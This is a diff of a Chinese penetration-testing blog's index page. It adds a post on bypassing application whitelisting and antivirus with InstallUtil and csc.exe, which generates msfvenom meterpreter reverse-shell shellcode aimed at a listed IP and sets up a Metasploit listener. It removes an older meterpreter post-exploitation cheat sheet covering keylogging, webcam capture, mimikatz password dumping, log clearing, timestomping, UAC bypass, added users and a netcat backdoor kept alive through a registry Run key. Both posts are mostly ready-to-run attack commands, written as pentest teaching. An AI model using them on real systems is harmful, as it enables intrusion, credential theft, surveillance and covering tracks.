@@ -252,6 +252,157 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/InstallUtil&csc.exe-bypass-application-whitelisting/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="pplsec">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/ppl.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="pplsec">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/03/26/InstallUtil&csc.exe-bypass-application-whitelisting/" itemprop="url">InstallUtil&csc.exe-bypass application whitelisting</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-03-26T22:38:36+08:00">
+                2019-03-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">In</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
+                    <span itemprop="name">渗透测试</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h3 id="1）通过msfvenom生成C＃的shellcode"><a href="#1）通过msfvenom生成C＃的shellcode" class="headerlink" title="1）通过msfvenom生成C＃的shellcode"></a>1）通过msfvenom生成C＃的shellcode</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=111.111.111.111 lport=4443 -f csharp</span><br></pre></td></tr></table></figure>
+<p><img src="/images/InstallUtil&amp;csc.exe-bypass-application-whitelisting-1.png" alt=""></p>
+<h3 id="2）下载InstallUtil-Shellcode-cs，将上面生成的shellcode复制到该cs文件中"><a href="#2）下载InstallUtil-Shellcode-cs，将上面生成的shellcode复制到该cs文件中" class="headerlink" title="2）下载InstallUtil-Shellcode.cs，将上面生成的shellcode复制到该cs文件中"></a>2）下载InstallUtil-Shellcode.cs，将上面生成的shellcode复制到该cs文件中</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">https://gist.github.com/lithackr/b692378825e15bfad42f78756a5a3260 </span><br><span class="line">InstallUtil-Shellcode-cs</span><br></pre></td></tr></table></figure>
+<h3 id="3）csc编译InstallUtil-ShellCode-cs"><a href="#3）csc编译InstallUtil-ShellCode-cs" class="headerlink" title="3）csc编译InstallUtil-ShellCode.cs"></a>3）csc编译InstallUtil-ShellCode.cs</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /unsafe /platform:x86 /out:D:\test\InstallUtil-shell.exe D:\test\InstallUtil-ShellCode.cs</span><br></pre></td></tr></table></figure>
+<p>编译生成的文件后缀名无所谓exe dll txt都可以，但只能InstallUtil.exe来触发<br><img src="/images/InstallUtil&amp;csc.exe-bypass-application-whitelisting-2.png" alt=""></p>
+<h3 id="4）InstallUtil-exe执行-反弹shell"><a href="#4）InstallUtil-exe执行-反弹shell" class="headerlink" title="4）InstallUtil.exe执行 反弹shell"></a>4）InstallUtil.exe执行 反弹shell</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\Microsoft.NET\Framework\v2.0.50727\InstallUtil.exe /logfile= /LogToConsole=false /U D:\test\InstallUtil-shell.exe</span><br></pre></td></tr></table></figure>
+<p><img src="/images/InstallUtil&amp;csc.exe-bypass-application-whitelisting-3.png" alt=""></p>
+<p>成功bypass av，反弹shell：<br><img src="/images/InstallUtil&amp;csc.exe-bypass-application-whitelisting-4.png" alt=""></p>
+<h3 id="补充：MSF开启监听"><a href="#补充：MSF开启监听" class="headerlink" title="补充：MSF开启监听"></a>补充：MSF开启监听</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set LHOST 172.16.0.19</span><br><span class="line">set LPORT 4443</span><br><span class="line">exploit -j</span><br></pre></td></tr></table></figure>
+<p><strong>参考:</strong><br><a href="https://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/" target="_blank" rel="noopener">https://www.blackhillsinfosec.com/how-to-bypass-application-whitelisting-av/</a> </p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/03/26/MSBuild.exe-bypass-application-whitelisting/">
 
     <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
@@ -1794,214 +1945,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/08/06/后渗透之meterpreter使用攻略/">
-
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="pplsec">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/ppl.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="pplsec">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/08/06/后渗透之meterpreter使用攻略/" itemprop="url">后渗透之meterpreter使用攻略</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-              <time title="Post created" itemprop="dateCreated datePublished" datetime="2018-08-06T09:38:36+08:00">
-                2018-08-06
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category">
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">In</span>
-              
-              
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
-                  <a href="/categories/渗透测试/" itemprop="url" rel="index">
-                    <span itemprop="name">渗透测试</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <p>2018-08-06 首发于阿里先知: <a href="https://xz.aliyun.com/t/2536" target="_blank" rel="noopener">https://xz.aliyun.com/t/2536</a></p>
-<p>Metasploit中的Meterpreter模块在后渗透阶段具有强大的攻击力，本文主要整理了meterpreter的常用命令、脚本及使用方式。包含信息收集、提权、注册表操作、令牌操纵、哈希利用、后门植入等。</p>
-<h3 id="0x01-系统命令"><a href="#0x01-系统命令" class="headerlink" title="0x01.系统命令"></a>0x01.系统命令</h3><h4 id="1）基本系统命令"><a href="#1）基本系统命令" class="headerlink" title="1）基本系统命令"></a>1）基本系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">sessions    #sessions –h 查看帮助</span><br><span class="line">sessions -i &lt;ID值&gt;  #进入会话   -k  杀死会话</span><br><span class="line">background  #将当前会话放置后台</span><br><span class="line">run  #执行已有的模块，输入run后按两下tab，列出已有的脚本</span><br><span class="line">info #查看已有模块信息</span><br><span class="line">getuid # 查看权限 </span><br><span class="line">getpid # 获取当前进程的pid</span><br><span class="line">sysinfo # 查看目标机系统信息</span><br><span class="line">ps # 查看当前活跃进程    kill &lt;PID值&gt; 杀死进程</span><br><span class="line">idletime #查看目标机闲置时间</span><br><span class="line">reboot / shutdown   #重启/关机</span><br><span class="line">shell #进入目标机cmd shell</span><br></pre></td></tr></table></figure>
-<h4 id="2）uictl开关键盘-鼠标"><a href="#2）uictl开关键盘-鼠标" class="headerlink" title="2）uictl开关键盘/鼠标"></a>2）uictl开关键盘/鼠标</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">uictl [enable/disable] [keyboard/mouse/all]  #开启或禁止键盘/鼠标</span><br><span class="line">uictl disable mouse  #禁用鼠标</span><br><span class="line">uictl disable keyboard  #禁用键盘</span><br></pre></td></tr></table></figure>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8d78731c-998c-1.png" alt=""></p>
-<h4 id="3）webcam摄像头命令"><a href="#3）webcam摄像头命令" class="headerlink" title="3）webcam摄像头命令"></a>3）webcam摄像头命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">webcam_list  #查看摄像头</span><br><span class="line">webcam_snap   #通过摄像头拍照</span><br><span class="line">webcam_stream   #通过摄像头开启视频</span><br></pre></td></tr></table></figure>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8d93ac72-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8da675dc-998c-1.png" alt=""></p>
-<h4 id="4）execute执行文件"><a href="#4）execute执行文件" class="headerlink" title="4）execute执行文件"></a>4）execute执行文件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">execute #在目标机中执行文件</span><br><span class="line">execute -H -i -f cmd.exe # 创建新进程cmd.exe，-H不可见，-i交互</span><br></pre></td></tr></table></figure>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8db2c63e-998c-1.png" alt=""></p>
-<h4 id="5）migrate进程迁移"><a href="#5）migrate进程迁移" class="headerlink" title="5）migrate进程迁移"></a>5）migrate进程迁移</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">getpid    # 获取当前进程的pid</span><br><span class="line">ps   # 查看当前活跃进程</span><br><span class="line">migrate &lt;pid值&gt;    #将Meterpreter会话移植到指定pid值进程中</span><br><span class="line">kill &lt;pid值&gt;   #杀死进程</span><br></pre></td></tr></table></figure>
-<h4 id="6）clearav清除日志"><a href="#6）clearav清除日志" class="headerlink" title="6）clearav清除日志"></a>6）clearav清除日志</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">clearav  #清除windows中的应用程序日志、系统日志、安全日志</span><br></pre></td></tr></table></figure>
-<h3 id="0x02-文件系统命令"><a href="#0x02-文件系统命令" class="headerlink" title="0x02.文件系统命令"></a>0x02.文件系统命令</h3><h4 id="1）基本文件系统命令"><a href="#1）基本文件系统命令" class="headerlink" title="1）基本文件系统命令"></a>1）基本文件系统命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">getwd 或者pwd # 查看当前工作目录  </span><br><span class="line">ls</span><br><span class="line">cd</span><br><span class="line">search -f *pass*       # 搜索文件  -h查看帮助</span><br><span class="line">cat c:\\lltest\\lltestpasswd.txt  # 查看文件内容</span><br><span class="line">upload /tmp/hack.txt C:\\lltest  # 上传文件到目标机上</span><br><span class="line">download c:\\lltest\\lltestpasswd.txt /tmp/ # 下载文件到本机上</span><br><span class="line">edit c:\\1.txt #编辑或创建文件  没有的话，会新建文件</span><br><span class="line">rm C:\\lltest\\hack.txt</span><br><span class="line">mkdir lltest2  #只能在当前目录下创建文件夹</span><br><span class="line">rmdir lltest2  #只能删除当前目录下文件夹</span><br><span class="line">getlwd   或者 lpwd   #操作攻击者主机 查看当前目录</span><br><span class="line">lcd /tmp   #操作攻击者主机 切换目录</span><br></pre></td></tr></table></figure>
-<h4 id="2）timestomp伪造时间戳"><a href="#2）timestomp伪造时间戳" class="headerlink" title="2）timestomp伪造时间戳"></a>2）timestomp伪造时间戳</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">timestomp C:// -h   #查看帮助</span><br><span class="line">timestomp -v C://2.txt   #查看时间戳</span><br><span class="line">timestomp C://2.txt -f C://1.txt #将1.txt的时间戳复制给2.txt</span><br></pre></td></tr></table></figure>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8dc36548-998c-1.png" alt=""></p>
-<h3 id="0x03-网络命令"><a href="#0x03-网络命令" class="headerlink" title="0x03.网络命令"></a>0x03.网络命令</h3><h4 id="1）基本网络命令"><a href="#1）基本网络命令" class="headerlink" title="1）基本网络命令"></a>1）基本网络命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ipconfig/ifconfig</span><br><span class="line">netstat –ano</span><br><span class="line">arp</span><br><span class="line">getproxy   #查看代理信息</span><br><span class="line">route   #查看路由</span><br></pre></td></tr></table></figure>
-<h4 id="2）portfwd端口转发"><a href="#2）portfwd端口转发" class="headerlink" title="2）portfwd端口转发"></a>2）portfwd端口转发</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">portfwd add -l 6666 -p 3389 -r 127.0.0.1 #将目标机的3389端口转发到本地6666端口</span><br></pre></td></tr></table></figure>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232238-8dd84710-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8df589f6-998c-1.png" alt=""></p>
-<h4 id="3）autoroute添加路由"><a href="#3）autoroute添加路由" class="headerlink" title="3）autoroute添加路由"></a>3）autoroute添加路由</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run autoroute –h #查看帮助</span><br><span class="line">run autoroute -s 192.168.159.0/24  #添加到目标环境网络</span><br><span class="line">run autoroute –p  #查看添加的路由</span><br></pre></td></tr></table></figure>
-<p>然后可以利用arp_scanner、portscan等进行扫描<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/arp_scanner RHOSTS=192.168.159.0/24</span><br><span class="line">run auxiliary/scanner/portscan/tcp RHOSTS=192.168.159.144 PORTS=3389</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e0bdbca-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e1d7ec0-998c-1.png" alt=""></p>
-<h4 id="4）Socks4a代理"><a href="#4）Socks4a代理" class="headerlink" title="4）Socks4a代理"></a>4）Socks4a代理</h4><p>autoroute添加完路由后，还可以利用msf自带的sock4a模块进行Socks4a代理<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary/server/socks4a </span><br><span class="line">msf &gt; set srvhost 127.0.0.1</span><br><span class="line">msf &gt; set srvport 1080</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure></p>
-<p>然后vi /etc/proxychains.conf   #添加 socks4 127.0.0.1 1080<br>最后proxychains  使用Socks4a代理访问</p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e2ebffa-998c-1.png" alt=""></p>
-<h3 id="0x04-信息收集"><a href="#0x04-信息收集" class="headerlink" title="0x04.信息收集"></a>0x04.信息收集</h3><p>信息收集的脚本位于：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/metasploit-framework/modules/post/windows/gather</span><br><span class="line">/usr/share/metasploit-framework/modules/post/linux/gather</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e454716-998c-1.png" alt=""></p>
-<p>信息收集的脚本较多，仅列几个常用的：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/gather/checkvm #是否虚拟机</span><br><span class="line">run post/linux/gather/checkvm #是否虚拟机</span><br><span class="line">run post/windows/gather/forensics/enum_drives #查看分区</span><br><span class="line">run post/windows/gather/enum_applications #获取安装软件信息</span><br><span class="line">run post/windows/gather/dumplinks   #获取最近的文件操作</span><br><span class="line">run post/windows/gather/enum_ie  #获取IE缓存</span><br><span class="line">run post/windows/gather/enum_chrome   #获取Chrome缓存</span><br><span class="line">run post/windows/gather/enum_patches  #补丁信息</span><br><span class="line">run post/windows/gather/enum_domain  #查找域控</span><br></pre></td></tr></table></figure></p>
-<h3 id="0x05-提权"><a href="#0x05-提权" class="headerlink" title="0x05.提权"></a>0x05.提权</h3><h4 id="1-getsystem提权"><a href="#1-getsystem提权" class="headerlink" title="1)getsystem提权"></a>1)getsystem提权</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getsystem</span><br></pre></td></tr></table></figure>
-<p>getsystem工作原理：<br>①getsystem创建一个新的Windows服务，设置为SYSTEM运行，当它启动时连接到一个命名管道。<br>②getsystem产生一个进程，它创建一个命名管道并等待来自该服务的连接。<br>③Windows服务已启动，导致与命名管道建立连接。<br>④该进程接收连接并调用ImpersonateNamedPipeClient，从而为SYSTEM用户创建模拟令牌。<br>然后用新收集的SYSTEM模拟令牌产生cmd.exe，并且我们有一个SYSTEM特权进程。<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e5f42e2-998c-1.png" alt=""></p>
-<h4 id="2-bypassuac"><a href="#2-bypassuac" class="headerlink" title="2)bypassuac"></a>2)bypassuac</h4><p>内置多个pypassuac脚本，原理有所不同，使用方法类似，运行后返回一个新的会话，需要再次执行getsystem获取系统权限，如：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use exploit/windows/local/bypassuac</span><br><span class="line">use exploit/windows/local/bypassuac_injection</span><br><span class="line">use windows/local/bypassuac_vbs</span><br><span class="line">use windows/local/ask</span><br></pre></td></tr></table></figure></p>
-<p>如使用bypassuac.rb脚本：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/windows/local/bypassuac</span><br><span class="line">msf &gt; set SESSION 2</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232239-8e75a848-998c-1.png" alt=""></p>
-<h4 id="3-内核漏洞提权"><a href="#3-内核漏洞提权" class="headerlink" title="3)内核漏洞提权"></a>3)内核漏洞提权</h4><p>可先利用enum_patches模块 收集补丁信息，然后查找可用的exploits进行提权<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; run post/windows/gather/enum_patches  #查看补丁信息</span><br><span class="line">msf &gt; use exploit/windows/local/ms13_053_schlamperei</span><br><span class="line">msf &gt; set SESSION 2</span><br><span class="line">msf &gt; exploit</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8e85924e-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8e9b89e6-998c-1.png" alt=""></p>
-<h3 id="0x06-mimikatz抓取密码"><a href="#0x06-mimikatz抓取密码" class="headerlink" title="0x06.mimikatz抓取密码"></a>0x06.mimikatz抓取密码</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">load mimikatz    #help mimikatz 查看帮助</span><br><span class="line">wdigest  #获取Wdigest密码</span><br><span class="line">mimikatz_command -f samdump::hashes  #执行mimikatz原始命令</span><br><span class="line">mimikatz_command -f sekurlsa::searchPasswords</span><br></pre></td></tr></table></figure>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8eac2e2c-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8ebb6bc6-998c-1.png" alt=""></p>
-<h3 id="0x07-远程桌面-amp-截屏"><a href="#0x07-远程桌面-amp-截屏" class="headerlink" title="0x07.远程桌面&amp;截屏"></a>0x07.远程桌面&amp;截屏</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">enumdesktops  #查看可用的桌面</span><br><span class="line">getdesktop    #获取当前meterpreter 关联的桌面</span><br><span class="line">set_desktop   #设置meterpreter关联的桌面  -h查看帮助</span><br><span class="line">screenshot  #截屏</span><br><span class="line">use espia  #或者使用espia模块截屏  然后输入screengrab</span><br><span class="line">run vnc  #使用vnc远程桌面连接</span><br></pre></td></tr></table></figure>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232240-8ee6331a-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f1a70c6-998c-1.png" alt=""></p>
-<h3 id="0x08-开启rdp-amp-添加用户"><a href="#0x08-开启rdp-amp-添加用户" class="headerlink" title="0x08.开启rdp&amp;添加用户"></a>0x08.开启rdp&amp;添加用户</h3><h4 id="1-getgui命令"><a href="#1-getgui命令" class="headerlink" title="1)getgui命令"></a>1)getgui命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">run getgui –h #查看帮助</span><br><span class="line">run getgui -e #开启远程桌面</span><br><span class="line">run getgui -u lltest2 -p 123456   #添加用户</span><br><span class="line">run getgui -f 6661 –e   #3389端口转发到6661</span><br></pre></td></tr></table></figure>
-<p>getgui 系统不推荐，推荐使用run post/windows/manage/enable_rdp<br>getgui添加用户时，有时虽然可以成功添加用户，但是没有权限通过远程桌面登陆<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f3485ce-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f42c288-998c-1.png" alt=""></p>
-<h4 id="2-enable-rdp脚本"><a href="#2-enable-rdp脚本" class="headerlink" title="2)enable_rdp脚本"></a>2)enable_rdp脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">run post/windows/manage/enable_rdp  #开启远程桌面</span><br><span class="line">run post/windows/manage/enable_rdp USERNAME=www2 PASSWORD=123456 #添加用户</span><br><span class="line">run post/windows/manage/enable_rdp FORWARD=true LPORT=6662	#将3389端口转发到6662</span><br></pre></td></tr></table></figure>
-<p>脚本位于/usr/share/metasploit-framework/modules/post/windows/manage/enable_rdp.rb<br>通过enable_rdp.rb脚本可知：开启rdp是通过reg修改注册表；添加用户是调用cmd.exe 通过net user添加；端口转发是利用的portfwd命令<br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f547726-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f692b80-998c-1.png" alt=""></p>
-<h3 id="0x09-键盘记录"><a href="#0x09-键盘记录" class="headerlink" title="0x09.键盘记录"></a>0x09.键盘记录</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">keyscan_start  #开始键盘记录</span><br><span class="line">keyscan_dump   #导出记录数据</span><br><span class="line">keyscan_stop #结束键盘记录</span><br></pre></td></tr></table></figure>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f75ddc6-998c-1.png" alt=""></p>
-<h3 id="0x10-sniffer抓包"><a href="#0x10-sniffer抓包" class="headerlink" title="0x10.sniffer抓包"></a>0x10.sniffer抓包</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">use sniffer</span><br><span class="line">sniffer_interfaces   #查看网卡</span><br><span class="line">sniffer_start 2   #选择网卡 开始抓包</span><br><span class="line">sniffer_stats 2   #查看状态</span><br><span class="line">sniffer_dump 2 /tmp/lltest.pcap  #导出pcap数据包</span><br><span class="line">sniffer_stop 2   #停止抓包</span><br></pre></td></tr></table></figure>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f86f804-998c-1.png" alt=""></p>
-<h3 id="0x11-注册表操作"><a href="#0x11-注册表操作" class="headerlink" title="0x11.注册表操作"></a>0x11.注册表操作</h3><h4 id="1-注册表基本命令"><a href="#1-注册表基本命令" class="headerlink" title="1)注册表基本命令"></a>1)注册表基本命令</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">reg –h</span><br><span class="line">    -d   注册表中值的数据.    -k   注册表键路径    -v   注册表键名称</span><br><span class="line">    enumkey 枚举可获得的键    setval 设置键值    queryval 查询键值数据</span><br></pre></td></tr></table></figure>
-<h4 id="2-注册表设置nc后门"><a href="#2-注册表设置nc后门" class="headerlink" title="2)注册表设置nc后门"></a>2)注册表设置nc后门</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32 #上传nc</span><br><span class="line">reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run   #枚举run下的key</span><br><span class="line">reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v lltest_nc -d &apos;C:\windows\system32\nc.exe -Ldp 443 -e cmd.exe&apos; #设置键值</span><br><span class="line">reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v lltest_nc   #查看键值</span><br><span class="line"></span><br><span class="line">nc -v 192.168.159.144 443  #攻击者连接nc后门</span><br></pre></td></tr></table></figure>
-<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232241-8f98f61c-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fbd4d32-998c-1.png" alt=""><br><img src="https://xzfile.aliyuncs.com/media/upload/picture/20180806232242-8fcc6452-998c-1.png" alt=""></p>
